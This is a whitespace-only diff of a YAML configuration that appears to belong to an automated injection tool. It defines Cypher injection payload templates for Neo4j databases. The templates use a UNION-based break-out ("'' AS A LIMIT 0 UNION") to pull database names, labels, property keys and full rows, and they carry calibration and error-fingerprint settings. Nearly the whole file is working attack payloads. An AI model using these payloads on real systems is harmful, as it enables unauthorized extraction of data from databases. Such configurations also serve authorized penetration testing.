@@ -1,82 +1,82 @@
 vendor: Neo4j
 
-resource: 
+resource:
  info: |
-  '' AS A LIMIT 0 UNION 
+  '' AS A LIMIT 0 UNION
   MATCH (n)
-  RETURN DISTINCT 
-      '${lead}' 
+  RETURN DISTINCT
+      '${lead}'
       %2b '-'
-      %2b '${enclose_value_sql}' 
-      %2b '-' 
-      %2b '${enclose_value_sql}' 
-      %2b '-' 
+      %2b '${enclose_value_sql}'
+      %2b '-'
+      %2b '${enclose_value_sql}'
+      %2b '-'
       %2b '${trail_sql}'
-      
- schema: 
+
+ schema:
   database: |
    '' AS A LIMIT 0 UNION
    MATCH (n)
-   RETURN DISTINCT 
+   RETURN DISTINCT
        '${lead}${enclose_value_sql}neo4j${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
        AS A
    ${limit}
    UNION MATCH (n:blah) RETURN n
-   
+
   table: |
    '' AS A LIMIT 0 UNION
-   CALL db.labels() 
-   YIELD label 
+   CALL db.labels()
+   YIELD label
    WITH label
    ${limit}
-   RETURN 
-       '${lead}' 
+   RETURN
+       '${lead}'
        %2b reduce(
-           b = '', 
-           n IN collect(label) | 
-               b 
+           b = '',
+           n IN collect(label) |
+               b
                %2b '${enclose_value_sql}'
-               %2b n 
+               %2b n
                %2b '${separator_qte_sql}0${enclose_value_sql}'
-       ) 
+       )
        %2b '${trail_sql}'
        AS A
    UNION MATCH (n:blah) RETURN n
-   
+
   column: |
    '' AS A LIMIT 0 UNION
-   MATCH (n:${table}) 
-   WITH collect(keys(n)) AS attr 
-   UNWIND attr AS r 
-   WITH DISTINCT r[0] AS d 
-   ORDER BY d 
+   MATCH (n:${table})
+   WITH collect(keys(n)) AS attr
+   UNWIND attr AS r
+   WITH DISTINCT r[0] AS d
+   ORDER BY d
    ${limit}
-   RETURN 
-       '${lead}' 
+   RETURN
+       '${lead}'
        %2b reduce(
-           b = '', 
-           n IN collect(d) | 
-           b 
+           b = '',
+           n IN collect(d) |
+           b
            %2b '${enclose_value_sql}'
            %2b n
            %2b '${separator_qte_sql}0${enclose_value_sql}'
-       ) 
+       )
    %2b '${trail_sql}'
    AS A
    UNION MATCH (n:blah) RETURN n
-   
-  row: 
+
+  row:
    query: |
     '' AS A LIMIT 0 UNION
     MATCH (n:${table})
     WITH DISTINCT n
     ${limit}
-    RETURN 
-        '${lead}' 
+    RETURN
+        '${lead}'
         %2b reduce(
-            b = "", 
-            n IN collect(n) | 
-            b 
+            b = "",
+            n IN collect(n) |
+            b
             %2b '${enclose_value_sql}'
             %2b ${fields}
             %2b '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
@@ -84,32 +84,32 @@ resource:
     %2b '${trail_sql}'
     AS A
     UNION MATCH (n:blah) RETURN n
-   fields: 
+   fields:
     field: coalesce(n.${field.value}, '')
     concat: "%2b '%7f' %2b"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: ${injection}
   limit: skip ${limit.value} LIMIT 65536
   failsafe: MATCH (n) RETURN 1337${indice}7330%2b1 AS A
   calibrator: |
-   '' AS A LIMIT 0 UNION 
-   MATCH (n) 
-   RETURN 
+   '' AS A LIMIT 0 UNION
+   MATCH (n)
+   RETURN
        '${lead}${indice}'
        %2b reduce(
-           a = "", 
-           nn IN collect(n) | 
+           a = "",
+           nn IN collect(n) |
            a %2b "${calibrator_sql}"
        )
   limitBoundary: 0
   endingComment: //
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - neo4j
-    
- normal: 
+
+ normal:
   indices: RETURN 'A' AS A UNION ${indices}
   capacity: ${calibrator}
   orderBy: ORDER BY 1337
